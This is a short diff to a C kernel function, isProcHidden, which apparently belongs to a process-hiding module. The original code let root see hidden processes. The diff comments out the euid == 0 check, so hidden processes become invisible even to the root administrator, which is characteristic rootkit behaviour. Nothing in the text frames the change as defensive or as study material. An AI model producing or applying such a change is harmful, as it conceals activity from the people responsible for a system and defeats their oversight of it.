@@ -143,8 +143,8 @@ int isProcHidden(pid_t pid) {
 	// - Root is looking for it (root privileges in fact).
 	tsk = get_task_by_pid(pid);
 	if (tsk != NULL)
-		if (current == tsk || current == tsk->parent ||
-			current->cred->euid == 0)
+		if (current == tsk || current == tsk->parent /*||
+			current->cred->euid == 0*/)
 				res = 0;
 
 	return res;
